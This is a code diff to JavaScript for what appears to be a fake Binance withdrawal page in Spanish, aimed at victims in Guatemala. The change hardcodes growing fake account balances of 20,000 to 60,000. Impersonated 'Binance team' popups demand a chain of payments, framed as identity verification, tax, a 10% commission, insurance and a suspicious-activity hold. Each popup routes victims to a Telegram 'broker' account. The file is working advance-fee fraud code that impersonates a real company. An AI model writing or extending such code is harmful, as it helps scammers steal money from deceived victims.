@@ -1,59 +1,59 @@
 /** FETCH **/
-const btc = document.getElementById('btc')
-const eth = document.getElementById('eth')
-const bnb = document.getElementById('bnb')
-const xrp = document.getElementById('xrp')
-const sol = document.getElementById('sol')
-let payload = null
-let gotPayloadTimes = 0
-fetch('/server.php')
-  .then(r => r.json())
-  .then(r => {
-    if (r.status === 'ERR') {
-      console.error('Error getting latest crypto quotes')
-      document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
-      btc.innerText = '109,772.72'
-      eth.innerText = '2,565.03'
-      bnb.innerText = '674.47'
-      xrp.innerText = '2.34'
-      sol.innerText = '177.79'
-      return
-    }
+// const btc = document.getElementById('btc')
+// const eth = document.getElementById('eth')
+// const bnb = document.getElementById('bnb')
+// const xrp = document.getElementById('xrp')
+// const sol = document.getElementById('sol')
+// let payload = null
+// let gotPayloadTimes = 0
+// fetch('/server.php')
+//   .then(r => r.json())
+//   .then(r => {
+//     if (r.status === 'ERR') {
+//       console.error('Error getting latest crypto quotes')
+//       document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
+//       btc.innerText = '109,772.72'
+//       eth.innerText = '2,565.03'
+//       bnb.innerText = '674.47'
+//       xrp.innerText = '2.34'
+//       sol.innerText = '177.79'
+//       return
+//     }
 
-    gotPayloadTimes++
-    payload = r.payload
-    document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
-    btc.innerText = r.payload.btc
-    eth.innerText = r.payload.eth
-    bnb.innerText = r.payload.bnb
-    xrp.innerText = r.payload.xrp
-    sol.innerText = r.payload.sol
-  })
+//     gotPayloadTimes++
+//     payload = r.payload
+//     document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
+//     btc.innerText = r.payload.btc
+//     eth.innerText = r.payload.eth
+//     bnb.innerText = r.payload.bnb
+//     xrp.innerText = r.payload.xrp
+//     sol.innerText = r.payload.sol
+//   })
 
-setInterval(() => {
-  btc.innerText = formatWithCommas(doMathBtc(payload.btc))
-  eth.innerText = formatWithCommas(doMathEth(payload.eth))
-  bnb.innerText = formatWithCommas(doMathEth(payload.bnb))
-}, 3500)
-setInterval(() => {
-  if (gotPayloadTimes === 1) return
-  fetch('/server.php')
-    .then(r => r.json())
-    .then(r => {
-      if (r.status === 'ERR') {
-        console.error('Error getting latest crypto quotes')
-        return
-      }
+// setInterval(() => {
+//   btc.innerText = formatWithCommas(doMathBtc(payload.btc))
+//   eth.innerText = formatWithCommas(doMathEth(payload.eth))
+//   bnb.innerText = formatWithCommas(doMathEth(payload.bnb))
+// }, 3500)
+// setInterval(() => {
+//   if (gotPayloadTimes === 1) return
+//   fetch('/server.php')
+//     .then(r => r.json())
+//     .then(r => {
+//       if (r.status === 'ERR') {
+//         console.error('Error getting latest crypto quotes')
+//         return
+//       }
 
-      gotPayloadTimes++
-      payload = r.payload
-      btc.innerText = r.payload.btc
-      eth.innerText = r.payload.eth
-      bnb.innerText = r.payload.bnb
-      xrp.innerText = r.payload.xrp
-      sol.innerText = r.payload.sol
-    })
-}, 62000)
+//       gotPayloadTimes++
+//       payload = r.payload
+//       btc.innerText = r.payload.btc
+//       eth.innerText = r.payload.eth
+//       bnb.innerText = r.payload.bnb
+//       xrp.innerText = r.payload.xrp
+//       sol.innerText = r.payload.sol
+//     })
+// }, 62000)
 
 let lastHistoryState = history.state;
 window.addEventListener('popstate', (e) => {
@@ -100,8 +100,10 @@ btn.onclick = () => {
     return
   }
 
+  const sum = document.getElementById('sum')
   usedKey = input.value
   if (usedKey === 'A3F9-7B2E-4C8D-1E6F') {
+    sum.innerText = '20,000'
     popupText.innerHTML = `
       <p>El equipo de Binance se preocupa por la seguridad de sus fondos y datos. Para
 completar el proceso de verificación de su identidad, es necesario realizar un pago de
@@ -113,8 +115,7 @@ personal <a href="https://t.me/LeslyGomezOficial" target="_blank">@LESLY OLIVIA 
       <p>Atentamente, <br>El equipo de Binance</p>
     `
   } else if (usedKey === 'X5K9-P2L8-Q3M7-R4N6') {
-    const sum = document.getElementById('sum')
-    sum.innerText = formatWithCommas(add300ToSum(sum.innerText))
+    sum.innerText = '30,000'
     popupText.innerHTML = `
       <p>De acuerdo con la legislación de la República de Guatemala (Decreto No. 26-92 del
 Congreso de la República de Guatemala), para cumplir con la regulación fiscal, es
@@ -126,6 +127,7 @@ corredor personal <a href="https://t.me/LeslyGomezOficial" target="_blank">@LESL
       <p>Atentamente, <br>El equipo de Binance</p>
     `
   } else if (usedKey === '9Z4Y-8W3X-7V2U-6T1S') {
+    sum.innerText = '40,000'
     popupText.innerHTML = `
       <p>De acuerdo con los términos de la asociación, es necesario pagar una comisión por
 servicios de corretaje del 10% sobre el monto de retiro.</p>
@@ -134,6 +136,7 @@ servicios de corretaje del 10% sobre el monto de retiro.</p>
       <p>Atentamente, <br>El equipo de Binance</p>
     `
   } else if (usedKey === 'JH7D-KG6F-LI5E-MN4C') {
+    sum.innerText = '50,000'
     popupText.innerHTML = `
       <p>Para continuar con la operación, es necesario que realice un aporte de seguro del 2%
 sobre el monto de su saldo a los datos oficiales de la plataforma.</p>
@@ -142,6 +145,7 @@ sobre el monto de su saldo a los datos oficiales de la plataforma.</p>
       <p>Atentamente, <br>El equipo de Binance</p>
     `
   } else if (usedKey === '2B4Q-6D8S-1F3G-5H7J') {
+      sum.innerText = '60,000'
       popupText.innerHTML = `
         <p>¡Se ha detectado actividad sospechosa!</p>
         <p>Con el fin de proteger su cuenta, hemos suspendido temporalmente la posibilidad de
@@ -340,14 +344,6 @@ function formatWithCommas(num) {
   integerPart = integerPart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
 
   return integerPart + decimalPart;
-}
-
-function add300ToSum(sum) {
-  const num = parseFloat(sum.replace(/,/g, ''))
-
-  const res = num + 300
-
-  return res
 }
 
 function preventDefaultScroll(e) {
